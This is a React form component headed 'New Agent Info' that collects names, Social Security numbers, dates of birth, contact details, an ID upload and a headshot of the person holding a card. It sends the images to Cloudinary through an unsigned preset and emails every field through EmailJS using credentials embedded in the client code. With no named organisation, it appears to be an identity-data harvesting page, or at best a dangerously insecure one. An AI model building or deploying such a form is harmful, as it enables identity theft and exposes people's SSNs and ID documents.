import React, { useState } from "react";
import emailjs from "emailjs-com";
import { motion } from "framer-motion";

const states = [
  "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut",
  "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa",
  "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
  "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada",
  "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota",
  "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina",
  "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington",
  "West Virginia", "Wisconsin", "Wyoming",
];

const Form = () => {
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    ssn: "",
    dob: "",
    phone: "",
    email: "",
    address: "",
    address2: "",
    city: "",
    state: "",
    zipCode: "",
    uploadId: null,
    headshotImage: null,
  });

  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({});
  const [successMessage, setSuccessMessage] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  const handleChange = (e) => {
    const { name, value, type, files } = e.target;
    if (type === "file") {
      setFormData((prev) => ({ ...prev, [name]: files[0] }));
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }));
    }
  };

  const validateForm = () => {
    const newErrors = {};
    if (!formData.firstName.trim()) newErrors.firstName = "First name is required.";
    if (!formData.lastName.trim()) newErrors.lastName = "Last name is required.";
    if (!formData.ssn.match(/^\d{9}$/)) newErrors.ssn = "SSN must be a 9-digit number.";
    if (!formData.dob) newErrors.dob = "Date of birth is required.";
    if (!formData.phone.match(/^\d{10}$/)) newErrors.phone = "Phone number must be 10 digits.";
    if (!formData.email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) newErrors.email = "Invalid email format.";
    if (!formData.address.trim()) newErrors.address = "Address is required.";
    if (!formData.city.trim()) newErrors.city = "City is required.";
    if (!formData.state) newErrors.state = "State selection is required.";
    if (!formData.zipCode.match(/^\d{5}$/)) newErrors.zipCode = "ZIP Code must be 5 digits.";
    if (!formData.uploadId) newErrors.uploadId = "Upload ID is required.";
    if (!formData.headshotImage) newErrors.headshotImage = "Headshot image is required.";
    return newErrors;
  };

  const uploadImage = async (file) => {
    const formData = new FormData();
    formData.append("file", file);
    formData.append("upload_preset", "PhoneTel");
    const res = await fetch("https://api.cloudinary.com/v1_1/dvq8z9idm/image/upload", {
      method: "POST",
      body: formData,
    });
    const data = await res.json();
    return data.secure_url;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const formErrors = validateForm();
    if (Object.keys(formErrors).length > 0) {
      setErrors(formErrors);
      return;
    }
    setErrors({});
    setIsLoading(true);

    try {
      let headshotUrl = "";
      if (formData.headshotImage) {
        headshotUrl = await uploadImage(formData.headshotImage);
      }

      let uploadIdUrl = "";
      if (formData.uploadId) {
        uploadIdUrl = await uploadImage(formData.uploadId);
      }

      const emailData = {
        ...formData,
        headshotImage: headshotUrl,
        uploadId: uploadIdUrl,
      };

      const SERVICE_ID = "service_tj8ac6h";
      const TEMPLATE_ID = "template_5bqbq15";
      const USER_ID = "GSRmOqymJi-5RvZgZ";

      const response = await emailjs.send(SERVICE_ID, TEMPLATE_ID, emailData, USER_ID);

      if (response.status === 200) {
        setSuccessMessage("Form submitted successfully!");
        setErrorMessage("");
        setFormData({
          firstName: "",
          lastName: "",
          ssn: "",
          dob: "",
          phone: "",
          email: "",
          address: "",
          address2: "",
          city: "",
          state: "",
          zipCode: "",
          uploadId: null,
          headshotImage: null,
        });
      } else {
        setErrorMessage("Form submission failed. Please try again.");
      }
    } catch (error) {
      console.error("Error uploading images or sending email:", error);
      setErrorMessage("Form submission failed. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: -50 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
      className="min-h-screen bg-gradient-to-br from-blue-500 to-purple-700 flex justify-center items-center p-4"
    >
      <motion.div
        initial={{ scale: 0.8 }}
        animate={{ scale: 1 }}
        transition={{ duration: 0.5 }}
        className="bg-white p-8 rounded-lg shadow-2xl w-full max-w-3xl transform transition-all hover:shadow-3xl"
      >
        <div className="text-center mb-8">
          <motion.div
            initial={{ scale: 0 }}
            animate={{ scale: 1 }}
            transition={{ delay: 0.2, duration: 0.5 }}
            className="flex justify-center mb-6"
          >
            <img
              src="https://res.cloudinary.com/dzh3qalmv/image/upload/v1738096902/1_vnmrfb.png"
              alt="Logo"
              className="h-32 rounded-full border-4 border-blue-500 shadow-lg transform hover:scale-110 transition duration-300"
            />
          </motion.div>
          <motion.p
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.4, duration: 0.5 }}
            className="text-gray-600 mt-2 text-lg"
          >
            Welcome! Please fill out the form below.
          </motion.p>
        </div>

        <motion.h2
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.6, duration: 0.5 }}
          className="text-4xl font-bold text-center mb-8 text-blue-600"
        >
          New Agent Info
        </motion.h2>

        <form onSubmit={handleSubmit} className="space-y-6">
          {[
            { id: "firstName", label: "First Name", type: "text", placeholder: "Enter your first name" },
            { id: "lastName", label: "Last Name", type: "text", placeholder: "Enter your last name" },
            { id: "ssn", label: "SSN", type: "text", placeholder: "Enter your SSN (9 digits)" },
            { id: "dob", label: "Date of Birth", type: "date", placeholder: "" },
            { id: "phone", label: "Phone", type: "text", placeholder: "Enter your phone number (10 digits)" },
            { id: "email", label: "Email", type: "email", placeholder: "Enter your email address" },
            { id: "address", label: "Address", type: "text", placeholder: "Enter your address" },
            { id: "address2", label: "Address Line 2", type: "text", placeholder: "Enter additional address details" },
            { id: "city", label: "City", type: "text", placeholder: "Enter your city" },
            { id: "zipCode", label: "ZIP Code", type: "text", placeholder: "Enter your ZIP code (5 digits)" },
          ].map((field, index) => (
            <motion.div
              key={field.id}
              initial={{ opacity: 0, y: -20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.8 + index * 0.1, duration: 0.5 }}
            >
              <label htmlFor={field.id} className="block text-sm font-medium text-gray-700">
                {field.label}
              </label>
              <input
                id={field.id}
                name={field.id}
                type={field.type}
                value={formData[field.id] || ""}
                onChange={handleChange}
                placeholder={field.placeholder}
                className="mt-1 block w-full p-3 border border-gray-300 rounded-lg placeholder-gray-400 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
              />
              {errors[field.id] && <p className="text-red-500 text-sm mt-1">{errors[field.id]}</p>}
            </motion.div>
          ))}

          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 1.8, duration: 0.5 }}
          >
            <label htmlFor="state" className="block text-sm font-medium text-gray-700">
              State
            </label>
            <select
              id="state"
              name="state"
              value={formData.state}
              onChange={handleChange}
              className="mt-1 block w-full p-3 border border-gray-300 rounded-lg placeholder-gray-400 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
            >
              <option value="">Select State</option>
              {states.map((state) => (
                <option key={state} value={state}>
                  {state}
                </option>
              ))}
            </select>
            {errors.state && <p className="text-red-500 text-sm mt-1">{errors.state}</p>}
          </motion.div>

          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 2, duration: 0.5 }}
          >
            <label htmlFor="uploadId" className="block text-sm font-medium text-gray-700">
              Upload ID
            </label>
            <input
              id="uploadId"
              name="uploadId"
              type="file"
              onChange={handleChange}
              className="mt-1 block w-full p-3 border border-gray-300 rounded-lg placeholder-gray-400 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
            />
            {errors.uploadId && <p className="text-red-500 text-sm mt-1">{errors.uploadId}</p>}
          </motion.div>

          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 2.2, duration: 0.5 }}
          >
            <label htmlFor="headshotImage" className="block text-sm font-medium text-gray-700">
              Headshot Image Holding With Card
            </label>
            <input
              id="headshotImage"
              name="headshotImage"
              type="file"
              onChange={handleChange}
              className="mt-1 block w-full p-3 border border-gray-300 rounded-lg placeholder-gray-400 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
            />
            {errors.headshotImage && <p className="text-red-500 text-sm mt-1">{errors.headshotImage}</p>}
          </motion.div>

          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 2.4, duration: 0.5 }}
            className="flex justify-center mt-6"
          >
            <button
              type="submit"
              disabled={isLoading}
              className="bg-blue-600 text-white px-8 py-3 rounded-lg hover:bg-blue-700 transition duration-300 transform hover:scale-105"
            >
              {isLoading ? "Submitting..." : "Submit"}
            </button>
          </motion.div>
        </form>

        {successMessage && (
          <motion.p
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.5 }}
            className="text-green-500 mt-4 text-center"
          >
            {successMessage}
          </motion.p>
        )}
        {errorMessage && (
          <motion.p
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.5 }}
            className="text-red-500 mt-4 text-center"
          >
            {errorMessage}
          </motion.p>
        )}
      </motion.div>
    </motion.div>
  );
};

export default Form;